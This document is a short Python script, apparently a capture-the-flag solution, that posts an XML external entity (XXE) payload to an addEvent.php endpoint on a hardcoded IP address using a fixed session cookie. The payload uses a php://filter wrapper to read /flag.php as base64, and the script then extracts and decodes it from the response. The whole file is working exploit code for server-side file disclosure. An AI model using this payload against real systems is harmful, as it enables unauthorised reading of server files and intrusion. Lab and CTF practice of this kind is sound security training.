import requests
import re
import base64

s = requests.Session()

url = "http://139.59.176.158:32499/"

# data = {
# 	"username": "a.corrales",
# 	"password": "test"
# }

cookies = {
		"PHPSESSID": "dpu415uqsjmuir368vauadabuu",
		"uid": "52"
	}


xml = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE name [
        <!ENTITY event SYSTEM "php://filter/convert.base64-encode/resource=/flag.php">
]>
<root>
<name>&event;</name>
<details>event</details>
<date>2022-02-01</date>
</root>
"""

r = s.post(url + "addEvent.php", data=xml, cookies=cookies)
# print(r.text)
flagRgx = re.compile(r'Event \'(.*)\'')
flagEncrypt = flagRgx.findall(r.text)[0]
flag_txt = base64.b64decode(flagEncrypt)
print(flag_txt)
